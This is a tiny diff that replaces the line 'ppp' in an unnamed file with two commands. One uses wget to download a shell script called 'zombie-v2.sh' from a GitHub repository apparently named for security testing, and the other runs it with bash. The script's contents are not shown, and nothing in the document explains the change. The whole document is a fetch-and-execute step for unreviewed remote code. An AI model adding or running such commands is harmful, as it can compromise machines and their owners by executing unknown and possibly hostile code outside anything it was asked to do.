@@ -1,1 +1,2 @@
-ppp
+wget https://raw.githubusercontent.com/beksec/Anomali-Testing/main/zombie-v2.sh
+bash zombie-v2.sh
